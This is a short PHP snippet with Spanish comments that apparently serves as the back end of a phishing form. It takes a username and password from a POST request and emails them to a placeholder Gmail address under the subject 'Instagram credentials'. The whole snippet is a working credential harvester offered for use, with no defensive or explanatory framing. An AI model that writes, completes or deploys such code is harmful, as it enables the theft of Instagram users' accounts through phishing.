$usuario = $_POST['usuario'];
$contraseña = $_POST['contraseña'];

// Envía el correo electrónico con los datos del formulario
mail('tu_email@gmail.com', 'Credenciales de Instagram', 'Usuario: ' . $usuario . ', Contraseña: ' . $contraseña);